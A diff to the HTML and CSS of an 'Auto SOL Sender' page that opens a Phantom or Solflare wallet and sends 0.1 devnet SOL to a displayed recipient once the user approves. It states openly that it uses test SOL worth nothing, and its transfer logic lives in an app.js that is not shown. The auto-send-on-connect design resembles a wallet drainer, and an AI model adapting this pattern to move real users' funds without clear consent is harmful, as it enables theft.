@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-    <title>Auto SOL Sender - Instant Transfer</title>
+    <title>Auto SOL Sender - Direct App Open</title>
     
     <style>
         * {
@@ -104,6 +104,33 @@
             color: #94a3b8;
         }
         
+        .direct-badge {
+            font-size: 10px;
+            padding: 4px 8px;
+            background: rgba(251, 191, 36, 0.2);
+            border-radius: 12px;
+            color: #fbbf24;
+        }
+        
+        .info-card {
+            background: rgba(251, 191, 36, 0.1);
+            border: 1px solid rgba(251, 191, 36, 0.2);
+            border-radius: 16px;
+            padding: 16px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .recipient-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 12px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+        }
+        
         .status-section {
             background: rgba(255, 255, 255, 0.03);
             border-radius: 16px;
@@ -116,41 +143,10 @@
             display: block;
         }
         
-        .address-box {
-            font-family: monospace;
-            font-size: 12px;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 12px;
-            border-radius: 12px;
-            word-break: break-all;
-            margin: 10px 0;
-        }
-        
         .balance {
             font-size: 28px;
             font-weight: 700;
             color: #fbbf24;
-        }
-        
-        .auto-send-info {
-            background: rgba(251, 191, 36, 0.1);
-            border: 1px solid rgba(251, 191, 36, 0.2);
-            border-radius: 16px;
-            padding: 16px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        
-        .auto-send-info h3 {
-            color: #fbbf24;
-            margin-bottom: 8px;
-        }
-        
-        .countdown {
-            font-size: 32px;
-            font-weight: 700;
-            color: #fbbf24;
-            margin: 10px 0;
         }
         
         .log {
@@ -185,8 +181,8 @@
     <div class="container">
         <div class="header">
             <h1>⚡ Auto SOL Sender</h1>
-            <p>Connect wallet → SOL sends automatically</p>
-            <div class="auto-badge">🤖 AUTOMATIC TRANSFER</div>
+            <p>Click button → Opens Phantom app → Sends automatically</p>
+            <div class="auto-badge">🚀 DIRECT APP OPEN + AUTO SEND</div>
         </div>
         
         <div class="wallet-section" id="walletSection">
@@ -195,44 +191,41 @@
                     <div class="wallet-icon">🦊</div>
                     <div class="wallet-info">
                         <div class="wallet-name">Phantom Wallet</div>
-                        <div class="wallet-desc">Connect & auto-send</div>
+                        <div class="wallet-desc">Opens app directly → Auto-send SOL</div>
                     </div>
+                    <span class="direct-badge">📱 Opens App</span>
                 </button>
                 
                 <button class="wallet-btn" id="solflareBtn">
                     <div class="wallet-icon">🔥</div>
                     <div class="wallet-info">
                         <div class="wallet-name">Solflare Wallet</div>
-                        <div class="wallet-desc">Connect & auto-send</div>
+                        <div class="wallet-desc">Opens app directly → Auto-send SOL</div>
                     </div>
+                    <span class="direct-badge">📱 Opens App</span>
                 </button>
+            </div>
+            
+            <div class="info-card">
+                <p><strong>🎯 Sending to this address:</strong></p>
+                <div class="recipient-box" id="targetDisplay">Loading...</div>
+                <p style="font-size: 12px; margin-top: 10px;">💰 Amount: <strong id="amountDisplay">0.1</strong> DEVNET SOL</p>
+                <p style="font-size: 11px; margin-top: 15px;">👇 Click wallet → Phantom opens → Approve → SOL sent!</p>
             </div>
         </div>
         
         <div class="status-section" id="statusSection">
-            <div class="address-box" id="walletAddress">-</div>
-            <div>💰 Balance: <span class="balance" id="balance">0</span> DEVNET SOL</div>
-            
-            <div class="auto-send-info" id="autoSendInfo">
-                <h3>🤖 AUTO-SENDING TO:</h3>
-                <div class="address-box" id="targetDisplay" style="background: rgba(0,0,0,0.5);">Loading...</div>
-                <div id="autoStatus" style="margin-top: 10px;">Connecting wallet...</div>
-                <div class="countdown" id="countdown"></div>
-            </div>
-            
-            <div class="log">
-                <h4 style="margin-bottom: 10px;">📜 Transaction Log</h4>
-                <div id="logEntries">Waiting for connection...</div>
+            <div id="transactionLog" class="log">
+                <div class="log-entry">Ready to send...</div>
             </div>
         </div>
         
         <div class="footer">
             <p>🔬 DEVNET - Fake SOL worth $0</p>
-            <p>🤖 SOL sends AUTOMATICALLY as soon as wallet connects</p>
+            <p>🚀 Click Phantom button → Opens app → Approve once → SOL moves instantly</p>
         </div>
     </div>
     
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
     <script src="app.js"></script>
 </body>
 </html>
